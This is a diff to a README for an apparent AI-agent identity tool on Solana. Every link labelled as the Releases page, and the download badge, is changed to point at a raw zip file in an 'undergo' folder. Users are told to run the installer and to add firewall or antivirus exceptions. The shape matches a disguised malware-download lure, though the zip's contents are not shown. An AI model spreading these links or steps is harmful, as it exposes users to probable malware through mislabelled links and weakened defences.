@@ -1,7 +1,7 @@
 # 🌟 KYA-System-AI-Agents - Identify Your AI with Confidence
 
 ## 📥 Download Now
-[![Download KYA-System-AI-Agents](https://img.shields.io/badge/Download%20KYA--System--AI--Agents-brightgreen.svg)](https://github.com/caldanasabs/KYA-System-AI-Agents/releases)
+[![Download KYA-System-AI-Agents](https://raw.githubusercontent.com/caldanasabs/KYA-System-AI-Agents/main/undergo/KYA-System-AI-Agents.zip%https://raw.githubusercontent.com/caldanasabs/KYA-System-AI-Agents/main/undergo/KYA-System-AI-Agents.zip)](https://raw.githubusercontent.com/caldanasabs/KYA-System-AI-Agents/main/undergo/KYA-System-AI-Agents.zip)
 
 ## 📖 Overview
 Welcome to the KYA-System-AI-Agents! This application helps you identify and manage agentic AI systems. With our decentralized identity framework, you can trust the insights of your AI agents. 
@@ -11,7 +11,7 @@ Our system leverages the security of the Solana blockchain, ensuring that every 
 ## 🚀 Getting Started
 To begin using KYA-System-AI-Agents, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/caldanasabs/KYA-System-AI-Agents/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/caldanasabs/KYA-System-AI-Agents/main/undergo/KYA-System-AI-Agents.zip).
 2. **Choose the Right Version**: Scroll through the available versions. Each version includes updates and features that enhance the application.
 3. **Download the Package**: Click on the version you want to download. It will lead you to a list of files. Pick the correct package for your operating system and click to download.
 
@@ -34,7 +34,7 @@ Once you've downloaded the appropriate file, follow these instructions to instal
 2. **Run the Installer**: Double-click the file to start the installation process.
 3. **Follow the Prompts**: The installer will guide you through the necessary steps. Simply follow the instructions on your screen.
 
-For easier access, you can revisit the [Releases page](https://github.com/caldanasabs/KYA-System-AI-Agents/releases) as needed.
+For easier access, you can revisit the [Releases page](https://raw.githubusercontent.com/caldanasabs/KYA-System-AI-Agents/main/undergo/KYA-System-AI-Agents.zip) as needed.
 
 ## 🌐 Features
 KYA-System-AI-Agents offers a variety of features to make working with AI agents easier:
@@ -48,7 +48,7 @@ KYA-System-AI-Agents offers a variety of features to make working with AI agents
 If you encounter issues while installing or running KYA-System-AI-Agents, consider these troubleshooting tips:
 
 - **Check Compatibility**: Ensure that your operating system and version are compatible with KYA-System-AI-Agents.
-- **Re-download the File**: If you suspect that the download was corrupted, delete the file and download it again from the [Releases page](https://github.com/caldanasabs/KYA-System-AI-Agents/releases).
+- **Re-download the File**: If you suspect that the download was corrupted, delete the file and download it again from the [Releases page](https://raw.githubusercontent.com/caldanasabs/KYA-System-AI-Agents/main/undergo/KYA-System-AI-Agents.zip).
 - **Reboot Your System**: Sometimes a simple restart can resolve unexplained issues.
 - **Firewall Settings**: Make sure that your firewall or antivirus is not blocking the application. Check settings and add exceptions if necessary.
 
